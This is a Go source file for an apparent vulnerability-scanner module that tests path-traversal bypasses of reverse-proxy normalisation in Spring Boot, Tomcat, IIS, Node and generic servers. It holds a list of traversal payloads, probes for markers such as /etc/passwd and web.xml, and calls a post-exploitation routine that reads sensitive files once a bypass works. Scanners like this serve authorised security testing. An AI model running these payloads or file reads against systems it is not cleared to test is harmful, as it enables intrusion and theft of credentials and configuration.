// Package pathtraversal tests for framework-specific path traversal bypasses
// that exploit URL normalization differences between reverse proxies and
// application servers.
//
// Different frameworks normalize paths differently:
//   - Spring Boot: ..;/ (path parameter bypass)//   - Tomcat: /%2e%2e/ (double-encoded dot)
//   - Express/Node: %2F..%2F (encoded slash)
//   - Rails: ..%00/ (null byte truncation in older versions)
//   - IIS: ..%5C (backslash traversal)
//   - Nginx: ..%252f (double URL encoding)
//
// Deep mode only — sends traversal payloads.
package pathtraversal

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/scan"
	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scanner/authctx"
	"github.com/stormbane-security/beacon/internal/scanner/schemedetect"
)


func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return New()
	},
		scan.Check(finding.CheckExploitCredentialHarvest, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckExploitDataExtracted, finding.SeverityCritical, finding.ModeDeep),
		scan.Check(finding.CheckWebPathTraversal, finding.SeverityHigh, finding.ModeDeep),
	)
}
const scannerName = "pathtraversal"

// traversal holds a framework-specific path traversal payload.
type traversal struct {
	framework string
	// prefix is prepended to a known-protected path to attempt traversal.
	prefix string
}

var traversals = []traversal{
	{"Spring Boot", "/..;/"},
	{"Spring Boot", "/%2e%2e/"},
	{"Spring Boot", "/..%3B/"},
	{"Tomcat/Java", "/%2e%2e%2f"},
	{"IIS", "/..%5C"},
	{"IIS", "/%2e%2e%5c"},
	{"Generic", "/..%252f"},
	{"Generic", "/%c0%ae%c0%ae/"},
	{"Node/Express", "/%2F..%2F"},
	{"Generic", "/..%00/"},
}

// protectedPaths to try traversing out of.
var protectedPaths = []string{
	"/api/internal",
	"/admin",
	"/manage",
	"/actuator",
}

// sensitiveTargets — if traversal reaches these, it confirms the bypass.
// All lowercase because they are compared against strings.ToLower(body).
var sensitiveTargets = []string{
	"/etc/passwd",
	"actuator",
	"web-inf",
	"web.xml",
}

type Scanner struct{}

func New() *Scanner { return &Scanner{} }

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
		return nil, nil
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if c := authctx.HTTPClient(ctx); c != nil {
		client = c
	}

	base := schemedetect.Base(ctx, client, asset)
	var findings []finding.Finding

	for _, path := range protectedPaths {
		if ctx.Err() != nil {
			break
		}

		url := base + path

		// Baseline: check if the path is protected (403/401) or exists (200).
		getReq, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			continue
		}
		getReq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")
		getResp, err := client.Do(getReq)
		if err != nil {
			continue
		}
		_, _ = io.Copy(io.Discard, getResp.Body)
		_ = getResp.Body.Close()
		baseStatus := getResp.StatusCode

		// Try each traversal payload.
		for _, t := range traversals {
			if ctx.Err() != nil {
				break
			}

			// Build traversal URL: base + traversal_prefix + path_suffix
			// e.g., http://target/..;/admin or http://target/api/internal/..;/actuator
			traversalURL := base + t.prefix + strings.TrimPrefix(path, "/")
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, traversalURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16*1024))
			_ = resp.Body.Close()

			// Detection: response status changed from 403→200, OR body contains
			// sensitive content not present in the baseline.
			bypassed := false
			if baseStatus == 403 || baseStatus == 401 {
				if resp.StatusCode >= 200 && resp.StatusCode < 300 {
					bypassed = true
				}
			}
			// Also check if body contains sensitive content even if base was 200
			// (different content = traversed to a different path).
			bodyStr := strings.ToLower(string(body))
			for _, target := range sensitiveTargets {
				if strings.Contains(bodyStr, target) {
					bypassed = true
					break
				}
			}

			if bypassed {
				findings = append(findings, finding.Finding{
					CheckID:  finding.CheckWebPathTraversal,
					Module:   "deep",
					Scanner:  scannerName,
					Severity: finding.SeverityHigh,
					Title: fmt.Sprintf("Path traversal via %s normalization bypass on %s",
						t.framework, path),
					Description: fmt.Sprintf(
						"The server at %s is vulnerable to path traversal using %s-style "+
							"URL normalization. The path %q returns status %d, but %q returns "+
							"status %d, indicating the traversal payload bypasses path-based "+
							"access controls. This can expose internal endpoints, configuration "+
							"files, or application source code.",
						asset, t.framework, path, baseStatus, t.prefix+strings.TrimPrefix(path, "/"),
						resp.StatusCode),
					Asset: asset,
					ProofCommand: fmt.Sprintf("curl -si '%s'", traversalURL),
					Evidence: map[string]any{
						"framework":       t.framework,
						"traversal":       t.prefix,
						"base_path":       path,
						"base_status":     baseStatus,
						"traversal_url":   traversalURL,
						"traversal_status": resp.StatusCode,
						"body_snippet":    string(body[:min(len(body), 200)]),
					},
					DiscoveredAt: time.Now(),
				})

				// Post-exploitation: read sensitive files via same traversal
				postFindings := postExploit(ctx, client, asset, base, t.prefix)
				findings = append(findings, postFindings...)

				break // one traversal per path is enough
			}
		}
	}

	return findings, nil
}
